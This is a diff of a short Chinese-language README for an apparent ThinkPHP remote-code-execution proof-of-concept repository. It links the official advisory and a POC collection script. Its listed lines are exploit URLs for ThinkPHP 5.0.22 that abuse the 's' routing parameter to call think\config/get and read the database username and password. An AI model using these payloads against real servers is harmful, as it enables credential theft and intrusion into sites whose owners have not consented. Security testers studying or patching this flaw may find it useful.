@@ -1,7 +1,7 @@
 # thinkphp-RCE-POC</br>
 官方公告:https://blog.thinkphp.cn/869075</br>
-
-POC：</br>
+POC：https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection/blob/master/ScanThinkphpRCE-POC.py</br>
+请自定义POC。</br>
 # thinkphp 5.0.22</br>
 1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username</br>
 2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password</br>
